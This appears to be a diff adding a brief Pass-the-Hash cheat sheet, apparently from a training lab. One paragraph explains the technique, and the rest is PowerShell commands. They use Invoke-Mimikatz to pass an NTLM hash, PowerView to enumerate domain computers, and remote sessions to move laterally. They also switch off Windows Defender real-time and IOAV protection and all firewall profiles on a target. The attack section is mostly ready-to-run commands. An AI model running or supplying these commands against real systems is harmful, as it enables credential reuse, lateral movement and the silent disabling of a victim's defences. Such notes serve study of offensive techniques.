@@ -1,0 +1,26 @@
+A Pass-the-Hash (PtH) attack is a technique whereby an attacker captures a password hash (as opposed to the password characters) and then simply passes it through for authentication and potentially lateral access to other networked systems. The threat actor doesn’t need to decrypt the hash to obtain a plain text password. PtH attacks exploit the authentication protocol, as the passwords hash remains static for every session until the password is rotated. Attackers commonly obtain hashes by scraping a system’s active memory and other techniques.
+
+
+
+Import-Module .\Invoke-Mimikatz 
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:student5 /domain: /ntlm: /run:powershell.exe"'
+
+Import-Module .\Powerview.ps1
+Get-DomainComputer
+
+#see if we have access to a server
+Invoke-Command -ComputerName ad -ScriptBlock{whoami; whoami /groups; hostname}
+Invoke-Command -ComputerName web -ScriptBlock{whoami; whoami /groups; hostname}
+
+#creating a session and hosting on a variable
+$sess = New-PSsession -ComputerName web 
+
+#Disable AV and Firewall
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess
+
+#Entering Created Session
+Enter-PSsession $sess
+
+
